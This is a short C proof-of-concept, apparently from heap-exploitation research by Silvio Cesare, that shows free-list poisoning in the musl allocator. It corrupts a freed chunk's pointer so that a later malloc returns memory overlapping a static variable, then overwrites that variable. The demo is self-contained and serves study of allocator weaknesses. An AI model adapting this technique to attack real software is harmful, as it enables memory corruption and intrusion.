// Based on https://blog.infosectcbr.com.au/2019/11/uclibc-unlink-heap-exploitation.html
// Developed further in https://twitter.com/silviocesare/status/1203226799984955392
// Same idea as in https://blog.infosectcbr.com.au/2019/09/linux-heap-fast-bin-poisoning-part-1.html
// by Dr Silvio Cesare

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>

#if defined(__UCLIBC__) || defined(__GLIBC__)
#error "Wrong libc - needs Musl"
#endif

static long foo = 0;

int main() {

  long *p = malloc(10);
  long *q = malloc(10);

  // Insert into free list
  free(p);
  *(p+1) = (long)(&foo - 2); // poison

  q = malloc(10);
  q = malloc(10);
  memset(q, 'A', 10);

  if (foo) {
    printf("Target overwritten\n");
  } else {
    printf("Target NOT overwritten\n");
  }
}